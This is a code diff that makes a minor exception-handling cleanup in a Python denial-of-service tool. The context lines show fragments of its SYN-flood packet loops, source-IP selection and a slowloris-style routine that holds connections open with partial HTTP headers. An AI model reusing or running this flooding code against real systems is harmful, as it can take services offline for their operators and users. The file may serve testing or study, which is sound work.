@@ -188,13 +188,13 @@ class SYNFloodAttack:
             try:
                 gateway = netifaces.gateways()['default'][netifaces.AF_INET]
                 return gateway[1]
-            except:
+            except Exception:
                 pass
         
         # Fallback to scapy
         try:
             return conf.iface
-        except:
+        except Exception:
             return 'eth0'
     
     def validate_target(self):
@@ -237,7 +237,7 @@ class SYNFloodAttack:
                 real_ip = s.getsockname()[0]
                 s.close()
                 ips = [real_ip]
-            except:
+            except Exception:
                 ips = ['127.0.0.1']
         elif self.src_ip_range:
             # Generate IPs from range
@@ -737,7 +737,7 @@ class DOSSimulator:
                 send(packet, verbose=0)
                 stats['packets_sent'] += 1
                 time.sleep(1.0/rate)
-            except:
+            except Exception:
                 stats['packets_failed'] += 1
         
         return stats
@@ -765,7 +765,7 @@ class DOSSimulator:
                     send(packet, verbose=0)
                     stats['packets_sent'] += 1
                     time.sleep(1.0/(rate * len(self.target_ports)))
-            except:
+            except Exception:
                 stats['packets_failed'] += 1
         
         return stats
@@ -797,7 +797,7 @@ class DOSSimulator:
                 s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                 sockets_list.append(s)
                 stats['connections'] += 1
-            except:
+            except Exception:
                 pass
         
         # Maintain connections with periodic headers
@@ -808,7 +808,7 @@ class DOSSimulator:
                     # Send keep-alive header
                     s.send("X-a: b\r\n".encode())
                     stats['bytes_sent'] += 8
-                except:
+                except Exception:
                     sockets_list.remove(s)
                     stats['connections'] -= 1
             
